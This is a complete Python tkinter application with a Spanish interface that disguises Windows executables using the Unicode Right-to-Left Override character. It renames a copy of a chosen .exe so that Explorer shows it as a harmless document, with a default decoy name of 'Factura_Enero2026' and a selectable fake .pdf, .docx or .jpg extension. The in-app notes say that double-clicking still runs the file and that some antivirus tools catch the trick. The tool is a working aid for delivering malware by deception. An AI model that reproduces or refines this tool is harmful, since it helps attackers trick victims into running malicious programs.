import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter import ttk
from PIL import Image, ImageTk
import os
import shutil

# Unicode Right-to-Left Override character
RTLO = '\u202E'

class ExeIconChanger:
    def __init__(self, root):
        self.root = root
        self.root.title("Cambiador de Iconos y Extensión .EXE (RTLO)")
        self.root.geometry("650x750")
        self.root.resizable(True, True)
        
        # Variables
        self.exe_file = tk.StringVar()
        self.icon_file = tk.StringVar()
        self.preview_image = None
        self.extension_var = tk.StringVar(value=".pdf")
        self.base_name_var = tk.StringVar(value="Factura_Enero2026")
        
        self.root.configure(bg="#f0f0f0")
        self.create_widgets()
    
    def create_widgets(self):
        # Header
        header = tk.Frame(self.root, bg="#1e5ba8", height=80)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        title_label = tk.Label(header, text="🔒 Camuflaje RTLO para Ejecutables",
                               font=("Arial", 18, "bold"), fg="white", bg="#1e5ba8")
        title_label.pack(pady=15)
        
        subtitle = tk.Label(header, text="Técnica Right-to-Left Override (U+202E)",
                           font=("Arial", 10), fg="#e0e0e0", bg="#1e5ba8")
        subtitle.pack()
        
        # Main content con scroll
        canvas = tk.Canvas(self.root, bg="#f0f0f0", highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.root, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg="#f0f0f0")
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True, padx=20)
        scrollbar.pack(side="right", fill="y")
        
        canvas.bind_all("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))
        
        content = scrollable_frame
        
        # Explicación de RTLO
        info_frame = tk.Frame(content, bg="#d4edda", relief=tk.SOLID, borderwidth=1)
        info_frame.pack(fill=tk.X, pady=(20, 15))
        
        info_label = tk.Label(info_frame, 
                             text="✓ Esta técnica usa el carácter Unicode U+202E (RTLO)\n"
                                  "✓ El archivo SIGUE SIENDO .exe pero APARECE como otro tipo\n"
                                  "✓ Windows lo ejecutará normalmente al hacer doble clic\n"
                                  "⚠️ Algunos antivirus detectan archivos con RTLO",
                             font=("Arial", 9), fg="#155724", bg="#d4edda", justify=tk.LEFT)
        info_label.pack(padx=10, pady=10)
        
        # Paso 1: Cargar EXE
        exe_label = tk.Label(content, text="Paso 1: Selecciona el archivo .EXE original", 
                            font=("Arial", 11, "bold"), fg="#333", bg="#f0f0f0")
        exe_label.pack(anchor=tk.W, pady=(15, 5))
        
        exe_frame = tk.Frame(content, bg="white", relief=tk.SOLID, borderwidth=1)
        exe_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.exe_label = tk.Label(exe_frame, text="No seleccionado", font=("Arial", 9), 
                                  fg="#666", bg="white", wraplength=400, justify=tk.LEFT)
        self.exe_label.pack(side=tk.LEFT, padx=10, pady=10, fill=tk.X, expand=True)
        
        exe_btn = tk.Button(exe_frame, text="📂 Seleccionar EXE", command=self.select_exe,
                           bg="#007bff", fg="white", font=("Arial", 9), cursor="hand2")
        exe_btn.pack(side=tk.LEFT, padx=10, pady=10)
        
        # Paso 2: Cargar Icono (Opcional)
        icon_label = tk.Label(content, text="Paso 2: Selecciona el nuevo icono (OPCIONAL)", 
                             font=("Arial", 11, "bold"), fg="#333", bg="#f0f0f0")
        icon_label.pack(anchor=tk.W, pady=(10, 5))
        
        icon_frame = tk.Frame(content, bg="white", relief=tk.SOLID, borderwidth=1)
        icon_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.icon_label = tk.Label(icon_frame, text="No seleccionado", font=("Arial", 9), 
                                   fg="#666", bg="white", wraplength=400, justify=tk.LEFT)
        self.icon_label.pack(side=tk.LEFT, padx=10, pady=10, fill=tk.X, expand=True)
        
        icon_btn = tk.Button(icon_frame, text="🖼️ Seleccionar Icono", command=self.select_icon,
                            bg="#6c757d", fg="white", font=("Arial", 9), cursor="hand2")
        icon_btn.pack(side=tk.LEFT, padx=10, pady=10)
        
        # Preview del icono
        self.preview_frame = tk.Frame(content, bg="white", width=100, height=100, 
                                      relief=tk.SOLID, borderwidth=1)
        self.preview_frame.pack(pady=10)
        self.preview_frame.pack_propagate(False)
        
        self.preview_img_label = tk.Label(self.preview_frame, bg="white", text="Vista previa")
        self.preview_img_label.pack(expand=True)
        
        # Paso 3: Configurar RTLO
        rtlo_label = tk.Label(content, text="Paso 3: Configurar camuflaje RTLO", 
                             font=("Arial", 11, "bold"), fg="#333", bg="#f0f0f0")
        rtlo_label.pack(anchor=tk.W, pady=(10, 5))
        
        rtlo_frame = tk.Frame(content, bg="white", relief=tk.SOLID, borderwidth=1)
        rtlo_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Nombre base
        name_row = tk.Frame(rtlo_frame, bg="white")
        name_row.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(name_row, text="Nombre base:", font=("Arial", 9), bg="white").pack(side=tk.LEFT)
        name_entry = tk.Entry(name_row, textvariable=self.base_name_var, font=("Arial", 10), width=30)
        name_entry.pack(side=tk.LEFT, padx=10)
        
        # Extensión falsa
        ext_row = tk.Frame(rtlo_frame, bg="white")
        ext_row.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Label(ext_row, text="Extensión falsa:", font=("Arial", 9), bg="white").pack(side=tk.LEFT)
        
        ext_options = [".pdf", ".docx", ".xlsx", ".jpg", ".png", ".mp3", ".mp4", ".txt", ".zip"]
        ext_dropdown = ttk.Combobox(ext_row, textvariable=self.extension_var, values=ext_options,
                                    state="readonly", font=("Arial", 10), width=10)
        ext_dropdown.pack(side=tk.LEFT, padx=10)
        ext_dropdown.bind("<<ComboboxSelected>>", lambda e: self.update_preview_name())
        
        # Preview del nombre
        preview_name_frame = tk.Frame(rtlo_frame, bg="#f8f9fa")
        preview_name_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(preview_name_frame, text="Resultado visual:", font=("Arial", 9, "bold"), 
                bg="#f8f9fa").pack(anchor=tk.W)
        
        self.preview_name_label = tk.Label(preview_name_frame, text="", font=("Consolas", 12), 
                                          fg="#28a745", bg="#f8f9fa")
        self.preview_name_label.pack(anchor=tk.W, pady=5)
        
        tk.Label(preview_name_frame, text="Nombre real (con RTLO):", font=("Arial", 9, "bold"), 
                bg="#f8f9fa").pack(anchor=tk.W, pady=(10, 0))
        
        self.real_name_label = tk.Label(preview_name_frame, text="", font=("Consolas", 10), 
                                        fg="#dc3545", bg="#f8f9fa")
        self.real_name_label.pack(anchor=tk.W, pady=5)
        
        self.update_preview_name()
        
        # Botones de acción
        btn_frame = tk.Frame(content, bg="#f0f0f0")
        btn_frame.pack(fill=tk.X, pady=20)
        
        apply_btn = tk.Button(btn_frame, text="✅ Aplicar Camuflaje RTLO", 
                             command=self.apply_rtlo_camouflage,
                             bg="#28a745", fg="white", font=("Arial", 11, "bold"),
                             cursor="hand2", padx=20, pady=10)
        apply_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        reset_btn = tk.Button(btn_frame, text="🔄 Limpiar", command=self.reset_form,
                             bg="#dc3545", fg="white", font=("Arial", 10),
                             cursor="hand2", padx=15, pady=10)
        reset_btn.pack(side=tk.LEFT)
        
        # Status
        self.status_label = tk.Label(content, text="Esperando archivos...", 
                                     font=("Arial", 9), fg="#666", bg="#f0f0f0")
        self.status_label.pack(pady=10)
    
    def update_preview_name(self, event=None):
        """Actualiza la vista previa del nombre con RTLO"""
        base_name = self.base_name_var.get() or "Archivo"
        fake_ext = self.extension_var.get().replace(".", "")
        
        # El nombre real con RTLO (invertimos la extensión falsa + exe)
        # Ejemplo: Para que aparezca como "Facturaexe.pdf"
        # El nombre real es: "Factura" + RTLO + "fdp.exe"
        reversed_fake = fake_ext[::-1]  # "pdf" -> "fdp"
        real_name = f"{base_name}{RTLO}{reversed_fake}.exe"
        
        # Lo que el usuario VE en Windows (simulado)
        visual_name = f"{base_name}exe.{fake_ext}"
        
        self.preview_name_label.config(text=f"📄 {visual_name}")
        self.real_name_label.config(text=f"📁 {repr(real_name)}")
    
    def select_exe(self):
        file_path = filedialog.askopenfilename(
            title="Seleccionar archivo ejecutable",
            filetypes=[("Ejecutables", "*.exe"), ("Todos", "*.*")]
        )
        if file_path:
            self.exe_file.set(file_path)
            self.exe_label.config(text=os.path.basename(file_path), fg="#28a745")
            # Actualizar nombre base con el nombre del exe
            base = os.path.splitext(os.path.basename(file_path))[0]
            self.base_name_var.set(base)
            self.update_preview_name()
            self.update_status("✓ Archivo EXE cargado")
    
    def select_icon(self):
        file_path = filedialog.askopenfilename(
            title="Seleccionar icono",
            filetypes=[("Iconos", "*.ico"), ("Imágenes", "*.png *.jpg *.jpeg *.bmp"), ("Todos", "*.*")]
        )
        if file_path:
            self.icon_file.set(file_path)
            self.icon_label.config(text=os.path.basename(file_path), fg="#28a745")
            self.show_icon_preview(file_path)
            self.update_status("✓ Icono cargado")
    
    def show_icon_preview(self, path):
        try:
            img = Image.open(path)
            img = img.resize((64, 64), Image.Resampling.LANCZOS)
            self.preview_image = ImageTk.PhotoImage(img)
            self.preview_img_label.config(image=self.preview_image, text="")
        except:
            self.preview_img_label.config(text="No se pudo mostrar", image="")
    
    def apply_rtlo_camouflage(self):
        """Aplica el camuflaje RTLO al archivo EXE"""
        if not self.exe_file.get():
            messagebox.showerror("Error", "Debes seleccionar un archivo .EXE")
            return
        
        exe_path = self.exe_file.get()
        base_name = self.base_name_var.get() or "Archivo"
        fake_ext = self.extension_var.get().replace(".", "")
        
        try:
            exe_dir = os.path.dirname(exe_path)
            
            # Crear copia de seguridad
            backup_path = exe_path + ".backup"
            if not os.path.exists(backup_path):
                shutil.copy(exe_path, backup_path)
                self.update_status("✓ Copia de seguridad creada")
            
            # Construir nombre con RTLO
            reversed_fake = fake_ext[::-1]
            rtlo_name = f"{base_name}{RTLO}{reversed_fake}.exe"
            new_path = os.path.join(exe_dir, rtlo_name)
            
            # Renombrar el archivo
            if os.path.exists(new_path):
                os.remove(new_path)
            shutil.copy(exe_path, new_path)
            
            # Mostrar resultado
            visual_name = f"{base_name}exe.{fake_ext}"
            
            messagebox.showinfo("✓ Éxito", 
                f"¡Camuflaje RTLO aplicado!\n\n"
                f"Archivo original: {os.path.basename(exe_path)}\n"
                f"Nombre visual: {visual_name}\n"
                f"Ubicación: {exe_dir}\n\n"
                f"Copia de seguridad: {backup_path}\n\n"
                f"⚠️ El archivo aparecerá con el nombre camuflado en el Explorador de Windows.\n"
                f"Al hacer doble clic, se ejecutará normalmente.")
            
            self.update_status("✓ Camuflaje RTLO aplicado correctamente")
            
        except Exception as e:
            messagebox.showerror("Error", f"Error al aplicar camuflaje: {str(e)}")
            self.update_status("✗ Error en el proceso")
    
    def update_status(self, message):
        self.status_label.config(text=message)
        self.root.update()
    
    def reset_form(self):
        self.exe_file.set("")
        self.icon_file.set("")
        self.exe_label.config(text="No seleccionado", fg="#666")
        self.icon_label.config(text="No seleccionado", fg="#666")
        self.preview_img_label.config(text="Vista previa", image="")
        self.base_name_var.set("Factura_Enero2026")
        self.extension_var.set(".pdf")
        self.update_preview_name()
        self.update_status("Esperando archivos...")

if __name__ == "__main__":
    root = tk.Tk()
    app = ExeIconChanger(root)
    root.mainloop()